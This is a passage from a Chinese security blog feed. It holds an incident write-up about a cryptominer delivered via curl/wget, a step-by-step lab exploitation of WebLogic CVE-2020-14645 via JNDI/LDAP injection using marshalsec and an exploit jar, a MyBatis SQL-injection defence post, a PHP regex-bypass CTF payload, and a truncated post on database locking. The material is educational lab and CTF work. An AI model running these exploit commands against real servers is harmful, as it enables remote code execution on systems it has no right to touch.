class="identifier">DelegatingMethodAccessorImpl</span>.</span></span>invoke(<span class="module-access"><span class="module"><span class="identifier">DelegatingMethodAccessorImpl</span>.</span></span>java:<span class="number">43</span>)</span><br><span class="line">at java.lang.reflect.<span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke(<span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>java:<span class="number">498</span>)</span><br><span class="line">at java.io.<span class="module-access"><span class="module"><span class="identifier">ObjectStreamClass</span>.</span></span>invoke<span class="constructor">ReadObject(ObjectStreamClass.<span class="params">java</span>:1170)</span></span><br><span class="line">at java.io.<span class="module-access"><span class="module"><span class="identifier">ObjectInputStream</span>.</span></span>read<span class="constructor">SerialData(ObjectInputStream.<span class="params">java</span>:2178)</span></span><br><span class="line">at java.io.<span class="module-access"><span class="module"><span class="identifier">ObjectInputStream</span>.</span></span>read<span class="constructor">OrdinaryObject(ObjectInputStream.<span class="params">java</span>:2069)</span></span><br><span class="line">at java.io.<span class="module-access"><span class="module"><span class="identifier">ObjectInputStream</span>.</span></span>read<span class="constructor">Object0(ObjectInputStream.<span class="params">java</span>:1573)</span></span><br><span class="line">at java.io.<span class="module-access"><span class="module"><span class="identifier">ObjectInputStream</span>.</span></span>read<span class="constructor">Object(ObjectInputStream.<span class="params">java</span>:431)</span></span><br><span class="line">at weblogic.rjvm.<span class="module-access"><span class="module"><span class="identifier">InboundMsgAbbrev</span>.</span></span>read<span class="constructor">Object(InboundMsgAbbrev.<span class="params">java</span>:73)</span></span><br><span class="line">at weblogic.rjvm.<span class="module-access"><span class="module"><span class="identifier">InboundMsgAbbrev</span>.</span></span>read(<span class="module-access"><span class="module"><span class="identifier">InboundMsgAbbrev</span>.</span></span>java:<span class="number">45</span>)</span><br><span class="line">at weblogic.rjvm.<span class="module-access"><span class="module"><span class="identifier">MsgAbbrevJVMConnection</span>.</span></span>read<span class="constructor">MsgAbbrevs(MsgAbbrevJVMConnection.<span class="params">java</span>:325)</span></span><br><span class="line">at weblogic.rjvm.<span class="module-access"><span class="module"><span class="identifier">MsgAbbrevInputStream</span>.</span></span>init(<span class="module-access"><span class="module"><span class="identifier">MsgAbbrevInputStream</span>.</span></span>java:<span class="number">219</span>)</span><br><span class="line">at weblogic.rjvm.<span class="module-access"><span class="module"><span class="identifier">MsgAbbrevJVMConnection</span>.</span></span>dispatch(<span class="module-access"><span class="module"><span class="identifier">MsgAbbrevJVMConnection</span>.</span></span>java:<span class="number">557</span>)</span><br><span class="line">at weblogic.rjvm.t3.<span class="module-access"><span class="module"><span class="identifier">MuxableSocketT3</span>.</span></span>dispatch(<span class="module-access"><span class="module"><span class="identifier">MuxableSocketT3</span>.</span></span>java:<span class="number">666</span>)</span><br><span class="line">at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">BaseAbstractMuxableSocket</span>.</span></span>dispatch(<span class="module-access"><span class="module"><span class="identifier">BaseAbstractMuxableSocket</span>.</span></span>java:<span class="number">397</span>)</span><br><span class="line">at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">SocketMuxer</span>.</span></span>read<span class="constructor">ReadySocketOnce(SocketMuxer.<span class="params">java</span>:993)</span></span><br><span class="line">at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">SocketMuxer</span>.</span></span>read<span class="constructor">ReadySocket(SocketMuxer.<span class="params">java</span>:929)</span></span><br><span class="line">at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">NIOSocketMuxer</span>.</span></span>process(<span class="module-access"><span class="module"><span class="identifier">NIOSocketMuxer</span>.</span></span>java:<span class="number">599</span>)</span><br><span class="line">at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">NIOSocketMuxer</span>.</span></span>process<span class="constructor">Sockets(NIOSocketMuxer.<span class="params">java</span>:563)</span></span><br><span class="line">at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">SocketReaderRequest</span>.</span></span>run(<span class="module-access"><span class="module"><span class="identifier">SocketReaderRequest</span>.</span></span>java:<span class="number">30</span>)</span><br><span class="line">at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">SocketReaderRequest</span>.</span></span>execute(<span class="module-access"><span class="module"><span class="identifier">SocketReaderRequest</span>.</span></span>java:<span class="number">43</span>)</span><br><span class="line">at weblogic.kernel.<span class="module-access"><span class="module"><span class="identifier">ExecuteThread</span>.</span></span>execute(<span class="module-access"><span class="module"><span class="identifier">ExecuteThread</span>.</span></span>java:<span class="number">147</span>)</span><br><span class="line">at weblogic.kernel.<span class="module-access"><span class="module"><span class="identifier">ExecuteThread</span>.</span></span>run(<span class="module-access"><span class="module"><span class="identifier">ExecuteThread</span>.</span></span>java:<span class="number">119</span>)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>历史记录被删除了，感觉好多数据都被删除了。</p><p><img src="/9.jpg"></p><p>发现登陆记录被删除了</p><p><img src="/10.jpg"></p><p>果然重要信息都被清除掉了，太现实了~</p><p><img src="/11.jpg" alt=" /var/log"></p><h2 id="来缕一缕思路"><a href="#来缕一缕思路" class="headerlink" title="来缕一缕思路"></a>来缕一缕思路</h2><p>手先通过扫描，发现我的靶机存在漏洞。</p><p><img src="/7.jpg" alt="事件调查"></p><p>通过curl 和wget 投递挖矿程序-&gt;访问恶意ip执行了挖矿程序-&gt;脚本传入了挖矿程序后，运行后顺便把记录删了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-14645快速利用复现</title>
      <link href="/2020/07/25/CVE-2020-14645-%E5%A4%8D%E7%8E%B0-%E5%88%A9%E7%94%A8/"/>
      <url>/2020/07/25/CVE-2020-14645-%E5%A4%8D%E7%8E%B0-%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>已经有很多分析文章了，直接讲利用实在点</p><a id="more"></a><h2 id="需要知道的背景知识"><a href="#需要知道的背景知识" class="headerlink" title="需要知道的背景知识"></a>需要知道的背景知识</h2><h3 id="weblogic及weblogic版本选择"><a href="#weblogic及weblogic版本选择" class="headerlink" title="weblogic及weblogic版本选择"></a>weblogic及weblogic版本选择</h3><blockquote class="blockquote-center"><p>WebLogic应用服务器产品系列是业界最全面的开发、部署和集成企业管理软件的平台。简而言之就是中间件，是应用服务器。</p></blockquote><p>因为使用的是<code>com.tangosol.util.extractor.UniversalExtractor</code>这个类<code>Weblogic 12.2.1.4</code>的包</p><h3 id="JNDI及利用原理"><a href="#JNDI及利用原理" class="headerlink" title="JNDI及利用原理"></a>JNDI及利用原理</h3><ul><li>JNDI是SUN公司提供的一种标准的Java命名系统接口</li><li>JNDI可访问的现有的目录及服务有：<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、Windows XP/<span class="number">2000</span>/NT/Me/<span class="number">9</span>x的注册表、RMI、DSML v1&amp;v2、NIS。</span><br></pre></td></tr></table></figure></li></ul><p><b>利用原理</b></p><ul><li>客户端的lookup()方法</li><li>JDNI注入由于其加载动态类原理是JNDI Reference远程加载Object Factory类的特性</li></ul><h3 id="LDAP、RMI及关于RMI、LDAP的选择"><a href="#LDAP、RMI及关于RMI、LDAP的选择" class="headerlink" title="LDAP、RMI及关于RMI、LDAP的选择"></a>LDAP、RMI及关于RMI、LDAP的选择</h3><ol><li>LDAP的中文全称是轻量级目录访问协议</li><li>Java RMI是Java语言的远程调用(官方定义:java 编程接口)</li></ol><p>jdk版本在<b>jndi注入</b>中也起着至关重要的作用，而且不同的攻击对jdk的版本要求也不一致。</p><p><img src="/6.jpg"></p><ul><li><p>JDK 6u45、7u21之后：<code>java.rmi.server.useCodebaseOnly</code>的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的<code>java.rmi.server.codebase</code>指定路径加载类文件。使用这个属性来防止从其他Codebase地址上动态加载类，增加了<code>RMI ClassLoader</code>的安全性。</p></li><li><p>JDK 6u141、7u131、8u121之后：增加了<code>com.sun.jndi.rmi.object.trustURLCodebase</code>选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</p></li><li><p>JDK 6u211、7u201、8u191之后：增加了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</p></li></ul><h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">jdk:</span> <span class="string">8u181(因为版本原因，后续我们用LDAP)</span></span><br><span class="line"><span class="attr">weblogic:</span> <span class="number">12.2</span><span class="number">.1</span><span class="number">.4</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><p>搭建靶机可以用我最下面分享的一个github上的工具快速搭建，也可以直接镜像&#x3D; &#x3D;或者<code>docker-compose.yml</code></p><ol><li><p><a href="https://hub.docker.com/repository/docker/z1du/weblogic12214jdk8u181" target="_blank" rel="noopener">靶机docker镜像</a></p></li><li><p>docker-compose.yml</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">'2'</span></span><br><span class="line">services:</span><br><span class="line"> weblogic:</span><br><span class="line">   image: z1du/weblogic12214jdk8u181</span><br><span class="line">   ports:</span><br><span class="line">    - <span class="string">"7001:7001"</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="/1.jpg"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">开启http服务</span><br><span class="line">python -m http.server 5001</span><br></pre></td></tr></table></figure><p><img src="/2.jpg"></p><p>开启ldap服务(此处192.168.71.128为本机ip)<br>开启rmi方法差不多，我们只需要将LDAPRefServer改为RMIRefServer即可</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    LDAP_ip:LDAP_port/#后面填写你的恶意类的类名  </span><br><span class="line">    <span class="number">1099</span>是你开启rmi服务的端口号，如果不加端口号，它的默认端口号为<span class="number">1099</span>。</span><br><span class="line">    ldap的默认开启端口是<span class="number">1389</span>(无视这边<span class="number">1099</span>，懒得改)</span><br><span class="line"></span><br><span class="line">java -cp marshalsec<span class="number">-0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar  marshalsec.jndi.LDAPRefServer http:<span class="comment">//192.168.71.128:5001/#exp 1099</span></span><br></pre></td></tr></table></figure><p>👇</p><p><img src="/3.jpg"></p><p>此处192.168.71.133为靶机ip</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">       LDAP_ip:LDAP_port/#Class_name     weblogic_ip:weblogic_port</span><br><span class="line">java -jar CVE<span class="number">-2020</span><span class="number">-14645.</span>jar <span class="number">192.168</span><span class="number">.71</span><span class="number">.128</span>:<span class="number">1099</span>/#exp http:<span class="comment">//192.168.71.133:7001</span></span><br></pre></td></tr></table></figure><p><b>exp.java</b></p><p><img src="/4.jpg"></p><p><img src="/5.jpg"></p><hr><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a href="https://github.com/ChenZIDu/CVE-2020-14645" target="_blank" rel="noopener">exp及CVE-2020-14645.jar下载</a></p><p><a href="https://github.com/DSO-Lab/Weblogic_CVE-2020-14645" target="_blank" rel="noopener">Weblogic_CVE-2020-14645反序列化漏洞验证程序</a></p><p><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a></p><p><a href="https://github.com/QAX-A-Team/WeblogicEnvironment" target="_blank" rel="noopener">weblogic环境快速搭建工具</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6633#toc-5" target="_blank" rel="noopener">JNDI注入原理及利用</a></p><p><a href="https://paper.seebug.org/417/" target="_blank" rel="noopener">关于JNDI注入</a></p><p><a href="https://y4er.com/post/attack-java-jndi-rmi-ldap-2/" target="_blank" rel="noopener">攻击Java中的JNDI、RMI、LDAP</a></p>]]></content>
      
      
      <categories>
          
          <category> CVE-2020-14645 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis防注入分析</title>
      <link href="/2020/07/10/Mybatis%E9%98%B2%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
      <url>/2020/07/10/Mybatis%E9%98%B2%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><code>MyBatis</code>维护较为简单，入门也比较简单，网上的学习资料丰富，<code>Mybatis</code>也是一直保持更新状态。可以说是现在市场上最流行的框架之一了。它支持自定义 SQL、存储过程以及高级映射。<code>MyBatis</code> 免除了几乎所有的 JDBC 代码以及设置参数和获取结果集的工作。<code>MyBatis</code> 可以通过简单的 <code>XML</code> 或注解来配置和映射原始类型、接口和 <code>Java POJO</code>为数据库中的记录。</p><a id="more"></a><p><img src="/1.png"></p><p><b>我们在编写 SQL 语句时，难免会使用动态查询的方法，mybatis提供了两种方式 #{} 和 ${} 。</b></p><ul><li><b>#{value,jdbcType&#x3D;类型}</b> 在预处理时，会把参数部分用一个占位符 ? 替代，其中 value 表示接受输入参数的名称。能有效解决 SQL 注入问题</li><li><b>${}</b> 表示使用拼接字符串，将接受到参数的内容不加任何修饰符拼接在SQL语句后面，使用${}拼接SQL，如果预防不当可能会引起 SQL 注入问题。</li></ul><p><code>MyBatis</code> 的防注入主要<b>预编译</b>。当用<code>#{}</code>的时候先用占位符<code>?</code>替代，会在变量前后加上<code>&quot;&quot;</code>,再传入到sql语句里面。</p><p>Mybatis使用<code>#{}</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2020</span>-<span class="number">07</span>-<span class="number">01</span> <span class="number">20</span>:<span class="number">15</span>:<span class="number">34.090</span> DEBUG <span class="number">5283</span> --- [nio-<span class="number">8080</span>-exec-<span class="number">3</span>] c.e.l.m.PracticalMapper.selectFloor     : </span><br><span class="line">==&gt;  Preparing: select Practical from Practical where PracticalFloor = ? </span><br><span class="line"><span class="number">2020</span>-<span class="number">07</span>-<span class="number">01</span> <span class="number">20</span>:<span class="number">15</span>:<span class="number">34.090</span> DEBUG <span class="number">5283</span> --- [nio-<span class="number">8080</span>-exec-<span class="number">3</span>] c.e.l.m.PracticalMapper.selectFloor     :</span><br><span class="line">==&gt; Parameters: <span class="number">32</span>(String)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Practical <span class="keyword">from</span> Practical <span class="keyword">where</span> PracticalFloor = <span class="string">"32"</span></span><br></pre></td></tr></table></figure><p>但是如果用到了<code>order by</code>等关键字-来根据字段值进行排序时候，就会用到<code>${}</code>是拼接sql字符实现没有预编译的查询。</p><h2 id="Mybatis注入有可能产生的地方"><a href="#Mybatis注入有可能产生的地方" class="headerlink" title="Mybatis注入有可能产生的地方"></a>Mybatis注入有可能产生的地方</h2><p><b>无法使用预编译的语句的地方</b></p><h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><p>使用<code>order by</code>，按照字段名进行排序。如果有多种排序机制，也就是意味着这个<code>order by</code>后面的参数是个变量。</p><p><img src="/2.jpg"></p><p>当变量不被<code>&quot;&quot;</code>包裹，直接进行拼接后(参与sql编译)就容易造成sql注入。</p><p>(尽可能要使用<code>#{}</code>，就算不能用也一定要做好过滤)</p><h2 id="如何防止Mybatis注入"><a href="#如何防止Mybatis注入" class="headerlink" title="如何防止Mybatis注入"></a>如何防止Mybatis注入</h2><h3 id="最常见的过滤"><a href="#最常见的过滤" class="headerlink" title="最常见的过滤"></a>最常见的过滤</h3><ul><li>对传入参数进行and、or、select、from等重要关键字进行过滤 </li><li>对传入参数进行重要表名，以及一些列名的过滤</li><li>对传入参数进行类型、长度、格式、范围等校验</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="string">"传入字符"</span>.equals(<span class="string">"过滤字符"</span>))</span><br></pre></td></tr></table></figure><ul><li>对特殊字符进行转义如：<code>\、%、(、)、*、% </code> 等</li></ul><h3 id="对单用户进行限制"><a href="#对单用户进行限制" class="headerlink" title="对单用户进行限制"></a>对单用户进行限制</h3><ul><li>对用户账号使用的表进行分权(比如禁用insert,或者对别个表没有select权限)</li></ul><p><img src="/3.jpg"></p><h3 id="在xml文件中处理"><a href="#在xml文件中处理" class="headerlink" title="在xml文件中处理"></a>在xml文件中处理</h3><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"username != null and username.indexOf(';')==-1 and username gt 30'"</span> &gt;</span></span></span><br><span class="line"><span class="xml">        username = #</span><span class="template-variable">&#123;username,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="sql语句来处理"><a href="#sql语句来处理" class="headerlink" title="sql语句来处理"></a>sql语句来处理</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql: <span class="keyword">select</span> user_id <span class="keyword">from</span> <span class="keyword">User</span> <span class="keyword">where</span> user_name <span class="keyword">like</span> <span class="keyword">concat</span>(<span class="string">'%'</span>,$&#123;user_name&#125;,<span class="string">'%'</span>)</span><br></pre></td></tr></table></figure><h3 id="利用其他已经写好的轮子"><a href="#利用其他已经写好的轮子" class="headerlink" title="利用其他已经写好的轮子"></a>利用其他已经写好的轮子</h3><ul><li>Mybatis-Plus、tk.mybatis等</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mybatis.org/mybatis-3/zh/index.html" target="_blank" rel="noopener">mybatis</a><br><a href="http://www.mybatis.cn/" target="_blank" rel="noopener">mybatis中文网</a></p>]]></content>
      
      
      <categories>
          
          <category> Mybatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则限制加科学计数法绕过</title>
      <link href="/2020/06/25/%E6%AD%A3%E5%88%99%E9%99%90%E5%88%B6%E5%8A%A0%E7%A7%91%E5%AD%A6%E8%AE%A1%E6%95%B0%E6%B3%95%E7%BB%95%E8%BF%87/"/>
      <url>/2020/06/25/%E6%AD%A3%E5%88%99%E9%99%90%E5%88%B6%E5%8A%A0%E7%A7%91%E5%AD%A6%E8%AE%A1%E6%95%B0%E6%B3%95%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>比赛遇到一题源码泄露的题，思路没拓展开+经验不足，希望以后能发散性思维，吸取教训！</p><a id="more"></a><h2 id="大门就是gedit备份泄露"><a href="#大门就是gedit备份泄露" class="headerlink" title="大门就是gedit备份泄露"></a>大门就是gedit备份泄露</h2><p>gedit写代码时，目录下有后面带”~”的备份文件</p><p><img src="/1.png" alt="来自RoarNya"></p><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p><b>username必须要等于1024并且要小于1024，因为是&#x3D;&#x3D;，所以可以用四舍五入绕过</b></p><p><b>php中四舍五入精度要求很高，我这边用了14个9</b></p><p><img src="/2.jpg"></p><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="number">0</span>&gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password)</span><br><span class="line"></span><br><span class="line">意思是匹配到除空格符(空格键与[TAB]键)之外的所有按键，大于等于<span class="number">12</span>个</span><br></pre></td></tr></table></figure><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>进去while<br>[[:punct:]]任何标点符号<br>[:digit:] 任何数字<br>[[:upper:]]任何大写字母<br>[[:lower:]]任何小写字母</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="number">6</span> &gt; preg_match($reg, $password,$arr))&#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">匹配到的不同字符不能大于<span class="number">6</span>个</span><br></pre></td></tr></table></figure><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>[[:punct:]]任何标点符号<br>[:digit:] 任何数字<br>[[:upper:]]任何大写字母<br>[[:lower:]]任何小写字母</p><p>以上四种匹配要大于三次，否则break<br></p><p>并且password 的值&#x3D;&#x3D;2048</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$c =<span class="number">0</span>;</span><br><span class="line">$ps = <span class="keyword">array</span>(<span class="string">'punct'</span>,<span class="string">'digit'</span>,<span class="string">'upper'</span>,<span class="string">'lower'</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($ps <span class="keyword">as</span> $pt)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[[:$pt:]]+/"</span>,$password)) &#123;</span><br><span class="line">        $c += <span class="number">1</span>;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>.$c;</span><br><span class="line"><span class="keyword">if</span>($c&lt;<span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"小于三个"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"2048"</span> == $password)</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>.$flag;</span><br></pre></td></tr></table></figure><p>用科学计数法来绕，e代表10，+后面的数字代表几位</p><p>所以最后的payload</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">username</span>=<span class="number">1023.99999999999999999</span></span><br><span class="line"><span class="attr">password</span>=<span class="number">2048.00</span>e+<span class="number">0000</span></span><br></pre></td></tr></table></figure><p>我的模拟代码&#x3D; &#x3D; </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $flag=<span class="string">"flag&#123;nice&#125;"</span>;</span><br><span class="line">    $username=<span class="string">"chenzidu"</span>;</span><br><span class="line">    $password=<span class="string">"2048.00e+0000"</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span>&gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"yes"</span>.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">    $reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;</span><br><span class="line">    <span class="keyword">echo</span> preg_match($reg, $password,$arr);</span><br><span class="line"></span><br><span class="line">    $c =<span class="number">0</span>;</span><br><span class="line">    $ps = <span class="keyword">array</span>(<span class="string">'punct'</span>,<span class="string">'digit'</span>,<span class="string">'upper'</span>,<span class="string">'lower'</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($ps <span class="keyword">as</span> $pt)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/[[:$pt:]]+/"</span>,$password)) &#123;</span><br><span class="line">            $c += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>.$c;</span><br><span class="line">    <span class="keyword">if</span>($c&lt;<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"小于三个"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"2048"</span> == $password)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"\n"</span>.$flag;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 正则 </category>
          
          <category> 科学计数法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>乐观锁与悲观锁</title>
      <link href="/2020/06/21/%E4%B9%90%E8%A7%82%E9%94%81%E4%B8%8E%E6%82%B2%E8%A7%82%E9%94%81/"/>
      <url>/2020/06/21/%E4%B9%90%E8%A7%82%E9%94%81%E4%B8%8E%E6%82%B2%E8%A7%82%E9%94%81/</url>
      
        <content type="html"><![CDATA[<p>最近做到条件竞争的题目，突然想起来以前搞项目的时候，老师也和我科普过这个。果然当初太单纯了哈哈哈哈。总觉得一起就一起，肯定能处理~</p><a id="more"></a><h2 id="为什么需要乐观锁与悲观锁"><a href="#为什么需要乐观锁与悲观锁" class="headerlink" title="为什么需要乐观锁与悲观锁"></a>为什么需要乐观锁与悲观锁</h2><p id="div-border-left-blue">如果10个人同时查看一个共有的数据。他们取来的值是固定的。但是如果他们同时修改那个值，比如说同时添加或者个别添加，个别删减。就会影响数据的一致性！</p>比如说<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">转账：</span><br><span class="line"><span class="number">1</span>、b给a账号转账<span class="number">100</span>元</span><br><span class="line"><span class="number">2</span>、a给b账号转账<span class="number">100</span>元</span><br><span class="line">如果两者同时发生，又没有锁的情况下，就会导致数据的不一致。</span><br></pre></td></tr></table></figure><p><img src="/1.jpg"></p><h2 id="乐观并发控制"><a href="#乐观并发控制" class="headerlink" title="乐观并发控制"></a>乐观并发控制</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote class="blockquote-center"><p>在关系数据库管理系统里，<b>乐观并发控制</b>（又名“<b>乐观锁</b>”，Optimistic Concurrency Control，缩写“OCC”）是一种并发控制的方法。它假设多用户并发的事务在处理时不会彼此互相影响，各事务能够在不产生锁的情况下处理各自影响的那部分数据。在提交数据更新之前，每个事务会先检查在该事务读取数据后，有没有其他事务又修改了该数据。如果其他事务有更新的话，正在提交的事务会进行回滚。</p></blockquote><p><b>简单来说乐观锁就是，相信你平常处理的事务中几乎遇不到高并发的情况，冲突较少。如果一旦发生了冲突，就只能有一个人改动数据</b></p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>可以利用版本号或者时间来实现，比如说每次插入的时候,对当前的time字段更新为当前的时间。再有个人插入的时候如果当时取出来的时间小于现在数据表里的时间，则返回数据失效，让用户重新填写，或者其他选择。否则进行插入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> shop</span><br><span class="line"><span class="keyword">set</span> numi</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">id</span>= <span class="string">"当前要更改的商品id"</span> <span class="keyword">and</span> <span class="keyword">version</span> &lt; <span class="string">"当前商品版本"</span></span><br></pre></td></tr></table></figure><p>概括下就是：每条数据一次只能由一个人操作，不能同时被多个人进行操作。</p><h2 id="悲观并发控制"><a href="#悲观并发控制" class="headerlink" title="悲观并发控制"></a>悲观并发控制</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><blockquote 